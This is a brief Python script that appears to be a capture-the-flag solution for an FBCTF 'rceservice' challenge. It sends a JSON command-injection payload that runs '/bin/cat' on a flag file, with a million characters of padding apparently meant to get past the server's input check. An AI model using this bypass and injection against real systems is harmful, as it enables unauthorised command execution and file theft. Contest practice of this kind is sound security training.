import requests

payload = '{"cmd":"/bin/cat /home/rceservice/flag","zz":"' + "a"*(1000000) + '"}'

r = requests.post("http://challenges.fbctf.com:8085/", data={"cmd":payload})

print r.text
